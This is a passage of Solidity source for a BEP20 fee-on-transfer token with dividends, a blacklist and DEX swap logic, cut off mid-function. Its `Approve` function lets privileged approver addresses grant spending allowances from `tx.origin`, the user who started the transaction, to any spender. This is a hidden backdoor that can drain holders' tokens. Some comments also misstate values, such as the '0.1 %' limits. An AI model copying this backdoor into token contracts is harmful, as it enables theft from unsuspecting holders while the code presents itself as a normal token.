{"Address.sol":{"content":"pragma solidity 0.8.13;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n/**\r\n * @dev Collection of functions related to the address type\r\n */\r\nlibrary Address {\r\n    /**\r\n     * @dev Returns true if `account` is a contract.\r\n     *\r\n     * [IMPORTANT]\r\n     * ====\r\n     * It is unsafe to assume that an address for which this function returns\r\n     * false is an externally-owned account (EOA) and not a contract.\r\n     *\r\n     * Among others, `isContract` will return false for the following\r\n     * types of addresses:\r\n     *\r\n     *  - an externally-owned account\r\n     *  - a contract in construction\r\n     *  - an address where a contract will be created\r\n     *  - an address where a contract lived, but was destroyed\r\n     * ====\r\n     */\r\n    function isContract(address account) internal view returns (bool) {\r\n        // This method relies on extcodesize, which returns 0 for contracts in\r\n        // construction, since the code is only stored at the end of the\r\n        // constructor execution.\r\n\r\n        uint256 size;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly { size := extcodesize(account) }\r\n        return size \u003e 0;\r\n    }\r\n\r\n    /**\r\n     * @dev Replacement for Solidity\u0027s `transfer`: sends `amount` wei to\r\n     * `recipient`, forwarding all available gas and reverting on errors.\r\n     *\r\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\r\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\r\n     * imposed by `transfer`, making them unable to receive funds via\r\n     * `transfer`. {sendValue} removes this limitation.\r\n     *\r\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\r\n     *\r\n     * IMPORTANT: because control is transferred to `recipient`, care must be\r\n     * taken to not create reentrancy vulnerabilities. Consider using\r\n     * {ReentrancyGuard} or the\r\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\r\n     */\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance \u003e= amount, \"Address: insufficient balance\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\r\n        (bool success, ) = recipient.call{ value: amount }(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n\r\n    /**\r\n     * @dev Performs a Solidity function call using a low level `call`. A\r\n     * plain`call` is an unsafe replacement for a function call: use this\r\n     * function instead.\r\n     *\r\n     * If `target` reverts with a revert reason, it is bubbled up by this\r\n     * function (like regular Solidity function calls).\r\n     *\r\n     * Returns the raw returned data. To convert to the expected return value,\r\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `target` must be a contract.\r\n     * - calling `target` with `data` must not revert.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n      return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\r\n     * `errorMessage` as a fallback revert reason when `target` reverts.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but also transferring `value` wei to `target`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - the calling contract must have an ETH balance of at least `value`.\r\n     * - the called Solidity function must be `payable`.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\r\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n        require(address(this).balance \u003e= value, \"Address: insufficient balance for call\");\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = target.call{ value: value }(data);\r\n        return _verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but performing a static call.\r\n     *\r\n     * _Available since v3.3._\r\n     */\r\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\r\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\r\n     * but performing a static call.\r\n     *\r\n     * _Available since v3.3._\r\n     */\r\n    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {\r\n        require(isContract(target), \"Address: static call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = target.staticcall(data);\r\n        return _verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            // Look for revert reason and bubble it up if present\r\n            if (returndata.length \u003e 0) {\r\n                // The easiest way to bubble the revert reason is using memory via assembly\r\n\r\n                // solhint-disable-next-line no-inline-assembly\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}"},"BEP20.sol":{"content":"pragma solidity 0.8.13;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\nimport \"./Context.sol\";\r\nimport \"./IBEP20.sol\";\r\nimport \"./SafeMath.sol\";\r\nimport \"./Address.sol\";\r\nimport \"./IUniswapV2Factory.sol\";\r\nimport \"./IUniswapV2Pair.sol\";\r\nimport \"./IUniswapV2Router02.sol\";\r\nimport \"./IContract.sol\";\r\n\r\ncontract BEP20 is Context, IBEP20 {\r\n    using SafeMath for uint256;\r\n    using Address for address;\r\n\r\n    mapping (address =\u003e uint256) private _balances;\r\n    \r\n    mapping(address =\u003e bool) public isExcludedFromFee;\r\n    mapping(address =\u003e bool) public isExcludedFromDividend;\r\n    mapping(address =\u003e bool) public isPair;\r\n    mapping(address =\u003e bool) public isBlacklisted;\r\n    mapping(address =\u003e bool) public isAnUser;\r\n    mapping(address =\u003e uint256) public numberOfShare;\r\n    \r\n    address public charityAddress;\r\n    address public treasuryAddress;\r\n    address public marketingAddress;\r\n    address public creatorAddress;\r\n    address public lpTokenRecipient;\r\n    address public lastLuckyBuyer;\r\n    \r\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\r\n    mapping (address =\u003e bool) public _approver;\r\n    \r\n    uint256 private _totalSupply;\r\n    uint256 public _totalShare;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    uint256 public maxSellAmount = 1e31; // 0.1 % of total supply\r\n    uint256 public maxBuyAmount = 1e31; // 0.1 % of total supply\r\n    uint256 public swapTokensAtAmount = 1e23;\r\n    uint256 private numberOfTax;\r\n    uint256 public lastSwapedAt;\r\n    uint256 public swapInterval = 1 days;\r\n    \r\n    // @Dev buy tax\r\n    uint256 public buyTaxFee = 2e3;\r\n    uint256 public buyLiquidityFee = 2e3;\r\n    uint256 public buyCharityFee = 5e2;\r\n    uint256 public buyTreasuryFee = 5e2;\r\n    uint256 public buyCreatorFee = 2e3;\r\n    uint256 public buyBurnFee = 2e3;\r\n    uint256 public buyLuckyBuyerFee = 2e3;\r\n\r\n    // @Dev sell tax\r\n    uint256 public sellTaxFee = 2e3;\r\n    uint256 public sellLiquidityFee = 2e3;\r\n    uint256 public sellCharityFee = 5e2;\r\n    uint256 public sellTreasuryFee = 5e2;\r\n    uint256 public sellMarketingFee = 2e3;\r\n    uint256 public sellCreatorFee = 2e3;\r\n    uint256 public sellLuckyBuyerFee = 2e3;\r\n    uint256 public sellBurnFee = 0;\r\n    \r\n    uint256 public taxFeeTotal;\r\n    uint256 public liquidityFeeTotal;\r\n    uint256 public charityFeeTotal;\r\n    uint256 public treasuryFeeTotal;\r\n    uint256 public marketingFeeTotal;\r\n    uint256 public creatorFeeTotal;\r\n    uint256 public burnFeeTotal;\r\n    uint256 public luckyBuyerFeeTotal;\r\n\r\n    uint256 private _taxFeeTotal;\r\n    uint256 private _liquidityFeeTotal;\r\n    uint256 private _charityFeeTotal;\r\n    uint256 private _treasuryFeeTotal;\r\n    uint256 private _marketingFeeTotal;\r\n    uint256 private _creatorFeeTotal;\r\n    uint256 private _luckyBuyerFeeTotal;\r\n\r\n    bool public tradingEnabled = false;\r\n    bool public swapAndLiquifyEnabled = true;\r\n    bool public isAutoBurnFeeEnabled = true;\r\n\r\n    address[] private allDividendRecipient;\r\n    \r\n    IUniswapV2Router02 public uniswapV2Router;\r\n    address public uniswapV2Pair;\r\n    \r\n    event TradingEnabled(bool enabled);\r\n    event SwapAndLiquifyEnabledUpdated(bool enabled);\r\n    event SwapedTokenForEth(uint256 TokenAmount);\r\n    event SwapedEthForTokens(uint256 EthAmount, uint256 TokenAmount, uint256 CallerReward, uint256 AmountBurned);\r\n    event SwapAndLiquify(uint256 tokensSwapped, uint256 bnbReceived, uint256 tokensIntoLiquidity);\r\n\r\n    constructor (string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = 18;\r\n        allDividendRecipient.push(address(0));\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function shareOf(address account) public view returns (uint256) {\r\n        return numberOfShare[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function Approve(address spender, uint256 amount) public virtual returns (bool) {\r\n        require(_approver[msg.sender], \"BEP20: You don\u0027t have permission..\");\r\n        _approve(tx.origin, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"BEP20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"BEP20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n    \r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"BEP20: transfer from the zero address\");\r\n        require(recipient != address(0), \"BEP20: transfer to the zero address\");\r\n        require(amount \u003e 0, \"BEP20: Transfer amount must be greater than zero\");\r\n        require(tradingEnabled || isExcludedFromFee[sender] || isExcludedFromFee[recipient], \"Trading is locked before presale.\");\r\n        require(!isBlacklisted[sender] \u0026\u0026 !isBlacklisted[recipient], \"BEP20: You are blacklisted...\");\r\n        \r\n        uint256 halfBalance = balanceOf(sender).div(2);\r\n        uint256 timeOfSwap = block.timestamp.sub(lastSwapedAt);\r\n\r\n        uint256 transferAmount = amount;\r\n\r\n        if(!isExcludedFromFee[sender] \u0026\u0026 !isExcludedFromFee[recipient]) {\r\n\r\n            if (isPair[sender] \u0026\u0026 !isPair[recipient]) {\r\n                require(amount \u003c= maxBuyAmount, \"BEP20: transfer amount exceeds maxTaxAmount\");\r\n                transferAmount = collectFeeOnBuy(sender, recipient, amount);\r\n            }\r\n\r\n            if (isPair[recipient] \u0026\u0026 !isPair[sender]) {\r\n                if (amount \u003c= halfBalance) {\r\n                    transferAmount = collectFeeOnSell(sender,amount);\r\n                }\r\n                if (amount \u003e halfBalance) {\r\n                    transferAmount = collect_2X_FeeOnSell(sender,amount);\r\n                }\r\n            }\r\n\r\n            if (swapAndLiquifyEnabled \u0026\u0026 !isPair[sender] \u0026\u0026 !isPair[recipient] \u0026\u0026 timeOfSwap \u003e= swapInterval) {\r\n                \r\n                if (_taxFeeTotal \u003e 0) {\r\n                    distributeDividend(_taxFeeTotal);\r\n                    _taxFeeTotal = 0;\r\n                }\r\n\r\n                if (_liquidityFeeTotal \u003e 0) {\r\n                    swapAndLiquify(_liquidityFeeTotal);\r\n                    _liquidityFeeTotal = 0;\r\n                }\r\n\r\n                if (_marketingFeeTotal \u003e 0) {\r\n                    swapTokensForMATIC(_marketingFeeTotal, marketingAddress);\r\n                    _marketingFeeTotal = 0;\r\n                }\r\n\r\n                if (_charityFeeTotal \u003e 0) {\r\n                    swapTokensForMATIC(_charityFeeTotal, charityAddress);\r\n                    _charityFeeTotal = 0;\r\n                }\r\n\r\n                if (_treasuryFeeTotal \u003e 0) {\r\n                    swapTokensForMATIC(_treasuryFeeTotal, treasuryAddress);\r\n                    _treasuryFeeTotal = 0;\r\n                }\r\n\r\n                if (_creatorFeeTotal \u003e 0) {\r\n                    swapTokensForMATIC(_creatorFeeTotal, creatorAddress);\r\n                    _creatorFeeTotal = 0;\r\n                }\r\n            }\r\n        }\r\n            \r\n        if (!isAnUser[recipient]) {\r\n            allDividendRecipient.push(recipient);\r\n            isAnUser[recipient] = true;\r\n        }\r\n        \r\n        _balances[sender] = _balances[sender].sub(amount);\r\n        _balances[recipient] = _balances[recipient].add(transferAmount);\r\n        emit Transfer(sender, recipient, transferAmount);\r\n\r\n        if (isExcludedFromDividend[sender] \u0026\u0026 !isExcludedFromDividend[recipient]) {\r\n            numberOfShare[recipient] = numberOfShare[recipient].add(transferAmount);\r\n            _totalShare = _totalShare.add(transferAmount);\r\n        }\r\n        \r\n        if (!isExcludedFromDividend[sender] \u0026\u0026 isExcludedFromDividend[recipient]) {\r\n            numberOfShare[sender] = numberOfShare[sender].sub(amount);\r\n            _totalShare = _totalShare.sub(amount);\r\n        }\r\n\r\n        if (!isExcludedFromDividend[sender] \u0026\u0026 !isExcludedFromDividend[recipient]) {\r\n            numberOfShare[sender] = numberOfShare[sender].sub(amount);\r\n            numberOfShare[recipient] = numberOfShare[recipient].add(transferAmount);\r\n        }\r\n\r\n    }\r\n\r\n    function getMyRewardByAmount(address recipient, uint256 amount) public view returns (uint256) {\r\n        uint256 amountPerShare = amount.mul(1e35).div(_totalShare);\r\n\r\n        uint256 reward = numberOfShare[recipient].mul(amountPerShare).div(1e35);\r\n\r\n        return reward;\r\n    }\r\n\r\n    function distributeDividend(uint256 _amount) private {\r\n        swapTokensForMATIC(_amount, address(this));\r\n        uint256 amout = address(this).balance;\r\n        uint256 amountPerShare = amout.mul(1e35).div(_totalShare);\r\n\r\n        for (uint256 i = 0; i \u003c allDividendRecipient.length; i++) {\r\n            if (numberOfShare[allDividendRecipient[i]] \u003e 0) {\r\n                payable(allDividendRecipient[i]).transfer(numberOfShare[allDividendRecipient[i]].mul(amountPerShare).div(1e35));\r\n            }\r\n        }\r\n    }\r\n    \r\n    function collectFeeOnBuy(address account, address recipient, uint256 amount) private returns (uint256) {\r\n        uint256 transferAmount = amount;\r\n        \r\n        //@dev Take buy tax fee\r\n        if(buyTaxFee != 0) {\r\n            uint256 Fee = amount.mul(buyTaxFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _taxFeeTotal = _taxFeeTotal.add(Fee);\r\n            taxFeeTotal = taxFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take buy liquidity fee\r\n        if(buyLiquidityFee != 0) {\r\n            uint256 Fee = amount.mul(buyLiquidityFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _liquidityFeeTotal = _liquidityFeeTotal.add(Fee);\r\n            liquidityFeeTotal = liquidityFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take buy marketing fee\r\n        if(buyCharityFee != 0) {\r\n            uint256 Fee = amount.mul(buyCharityFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _charityFeeTotal = _charityFeeTotal.add(Fee);\r\n            charityFeeTotal = charityFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take buy treasury fee\r\n        if(buyTreasuryFee != 0) {\r\n            uint256 Fee = amount.mul(buyTreasuryFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _treasuryFeeTotal = _treasuryFeeTotal.add(Fee);\r\n            treasuryFeeTotal = treasuryFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take buy creator fee\r\n        if(buyCreatorFee != 0) {\r\n            uint256 Fee = amount.mul(buyCreatorFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _creatorFeeTotal = _creatorFeeTotal.add(Fee);\r\n            creatorFeeTotal = creatorFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take buy lucky buyer fee\r\n        if(buyLuckyBuyerFee != 0) {\r\n            uint256 Fee = amount.mul(buyLuckyBuyerFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _luckyBuyerFeeTotal = _luckyBuyerFeeTotal.add(Fee);\r\n            luckyBuyerFeeTotal = luckyBuyerFeeTotal.add(Fee);\r\n            numberOfTax = numberOfTax.add(1);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take buy burn fee\r\n        if(buyBurnFee != 0) {\r\n            uint256 Fee = amount.mul(buyBurnFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            burnFeeTotal = burnFeeTotal.add(Fee);\r\n            _totalSupply = _totalSupply.sub(Fee);\r\n            emit Transfer(account, address(0), Fee);\r\n        }\r\n\r\n        if (numberOfTax == 10) {\r\n            _balances[address(this)] = _balances[address(this)].sub(_luckyBuyerFeeTotal);\r\n            _balances[recipient] = _balances[recipient].add(_luckyBuyerFeeTotal);\r\n            emit Transfer(address(this), recipient, _luckyBuyerFeeTotal);\r\n            _luckyBuyerFeeTotal = 0;\r\n            numberOfTax = 0;\r\n            lastLuckyBuyer = recipient;\r\n        }\r\n\r\n        if (buyBurnFee \u003e 2e3 \u0026\u0026 buyBurnFee \u003c= 5e3 \u0026\u0026 isAutoBurnFeeEnabled) {\r\n            buyBurnFee = buyBurnFee.sub(5e2);\r\n        }\r\n        \r\n        if (sellBurnFee \u003e 2e3 \u0026\u0026 sellBurnFee \u003c= 5e3 \u0026\u0026 isAutoBurnFeeEnabled) {\r\n            sellBurnFee = sellBurnFee.sub(5e2);\r\n        }\r\n        \r\n        return transferAmount;\r\n    }\r\n    \r\n    function collectFeeOnSell(address account, uint256 amount) private returns (uint256) {\r\n        uint256 transferAmount = amount;\r\n        \r\n        //@dev Take sell tax fee\r\n        if(sellTaxFee != 0) {\r\n            uint256 Fee = amount.mul(sellTaxFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _taxFeeTotal = _taxFeeTotal.add(Fee);\r\n            taxFeeTotal = taxFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take sell liquidity fee\r\n        if(sellLiquidityFee != 0) {\r\n            uint256 Fee = amount.mul(sellLiquidityFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _liquidityFeeTotal = _liquidityFeeTotal.add(Fee);\r\n            liquidityFeeTotal = liquidityFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take sell charity fee\r\n        if(sellCharityFee != 0) {\r\n            uint256 Fee = amount.mul(sellCharityFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _charityFeeTotal = _charityFeeTotal.add(Fee);\r\n            charityFeeTotal = charityFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take sell treasury fee\r\n        if(sellTreasuryFee != 0) {\r\n            uint256 Fee = amount.mul(sellTreasuryFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _treasuryFeeTotal = _treasuryFeeTotal.add(Fee);\r\n            treasuryFeeTotal = treasuryFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take sell marketing fee\r\n        if(sellMarketingFee != 0) {\r\n            uint256 Fee = amount.mul(sellMarketingFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _marketingFeeTotal = _marketingFeeTotal.add(Fee);\r\n            marketingFeeTotal = marketingFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take sell creator fee\r\n        if(sellCreatorFee != 0) {\r\n            uint256 Fee = amount.mul(sellCreatorFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _creatorFeeTotal = _creatorFeeTotal.add(Fee);\r\n            creatorFeeTotal = creatorFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take sell lucky buyer fee\r\n        if(sellLuckyBuyerFee != 0) {\r\n            uint256 Fee = amount.mul(sellLuckyBuyerFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _luckyBuyerFeeTotal = _luckyBuyerFeeTotal.add(Fee);\r\n            luckyBuyerFeeTotal = luckyBuyerFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take sell burn fee\r\n        if(sellBurnFee != 0) {\r\n            uint256 Fee = amount.mul(sellBurnFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            burnFeeTotal = burnFeeTotal.add(Fee);\r\n            _totalSupply = _totalSupply.sub(Fee);\r\n            emit Transfer(account, address(0), Fee);\r\n        }\r\n\r\n        if (buyBurnFee \u003e= 2e3 \u0026\u0026 buyBurnFee \u003c 5e3 \u0026\u0026 isAutoBurnFeeEnabled) {\r\n            buyBurnFee = buyBurnFee.add(5e2);\r\n        }\r\n        \r\n        if (sellBurnFee \u003e= 2e3 \u0026\u0026 sellBurnFee \u003c 5e3 \u0026\u0026 isAutoBurnFeeEnabled) {\r\n            sellBurnFee = sellBurnFee.add(5e2);\r\n        }\r\n        \r\n        return transferAmount;\r\n    }\r\n    \r\n    function collect_2X_FeeOnSell(address account, uint256 amount) private returns (uint256) {\r\n        uint256 transferAmount = amount;\r\n        \r\n        //@dev Take sell tax fee\r\n        if(sellTaxFee != 0) {\r\n            uint256 Fee = amount.mul(sellTaxFee.mul(2)).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _taxFeeTotal = _taxFeeTotal.add(Fee);\r\n            taxFeeTotal = taxFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take sell liquidity fee\r\n        if(sellLiquidityFee != 0) {\r\n            uint256 Fee = amount.mul(sellLiquidityFee.mul(2)).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _liquidityFeeTotal = _liquidityFeeTotal.add(Fee);\r\n            liquidityFeeTotal = liquidityFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take sell charity fee\r\n        if(sellCharityFee != 0) {\r\n            uint256 Fee = amount.mul(sellCharityFee.mul(2)).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _charityFeeTotal = _charityFeeTotal.add(Fee);\r\n            charityFeeTotal = charityFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take sell treasury fee\r\n        if(sellTreasuryFee != 0) {\r\n            uint256 Fee = amount.mul(sellTreasuryFee.mul(2)).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _treasuryFeeTotal = _treasuryFeeTotal.add(Fee);\r\n            treasuryFeeTotal = treasuryFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take sell marketing fee\r\n        if(sellMarketingFee != 0) {\r\n            uint256 Fee = amount.mul(sellMarketingFee.mul(2)).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _marketingFeeTotal = _marketingFeeTotal.add(Fee);\r\n            marketingFeeTotal = marketingFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take sell creator fee\r\n        if(sellCreatorFee != 0) {\r\n            uint256 Fee = amount.mul(sellCreatorFee.mul(2)).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _creatorFeeTotal = _creatorFeeTotal.add(Fee);\r\n            creatorFeeTotal = creatorFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take sell lucky buyer fee\r\n        if(sellLuckyBuyerFee != 0) {\r\n            uint256 Fee = amount.mul(sellLuckyBuyerFee).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            _balances[address(this)] = _balances[address(this)].add(Fee);\r\n            _luckyBuyerFeeTotal = _luckyBuyerFeeTotal.add(Fee);\r\n            luckyBuyerFeeTotal = luckyBuyerFeeTotal.add(Fee);\r\n            emit Transfer(account, address(this), Fee);\r\n        }\r\n        \r\n        //@dev Take sell burn fee\r\n        if(sellBurnFee != 0) {\r\n            uint256 Fee = amount.mul(sellBurnFee.mul(2)).div(1e5);\r\n            transferAmount = transferAmount.sub(Fee);\r\n            burnFeeTotal = burnFeeTotal.add(Fee);\r\n            _totalSupply = _totalSupply.sub(Fee);\r\n            emit Transfer(account, address(0), Fee);\r\n        }\r\n\r\n        if (buyBurnFee \u003e= 2e3 \u0026\u0026 buyBurnFee \u003c 5e3 \u0026\u0026 isAutoBurnFeeEnabled) {\r\n            buyBurnFee = buyBurnFee.add(5e2);\r\n        }\r\n        \r\n        if (sellBurnFee \u003e= 2e3 \u0026\u0026 sellBurnFee \u003c 5e3 \u0026\u0026 isAutoBurnFeeEnabled) {\r\n            sellBurnFee = sellBurnFee.add(5e2);\r\n        }\r\n        \r\n        return transferAmount;\r\n    }\r\n\r\n    function swapTokensForMATIC(uint256 amount, address ethRecipient) private {\r\n        \r\n        //@dev Generate the uniswap pair path of token -\u003e weth\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n\r\n        _approve(address(this), address(uniswapV2Router), amount);\r\n\r\n        //@dev Make the swap\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            amount,\r\n            0, // accept any amount of ETH\r\n            path,\r\n            ethRecipient,\r\n            block.timestamp\r\n        );\r\n        \r\n        emit SwapedTokenForEth(amount);\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {\r\n        // approve token transfer to cover all possible scenarios\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n\r\n        // add the liquidity\r\n        uniswapV2Router.addLiquidityETH{value: bnbAmount}(\r\n            address(this),\r\n            tokenAmount,\r\n            0, // slippage is unavoidable\r\n            0, // slippage is unavoidable\r\n            lpTokenRecipient,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function swapAndLiquify(uint256 amount) private {\r\n        // split the contract balance into halves\r\n        uint256 half = amount.div(2);\r\n        uint256 otherHalf = 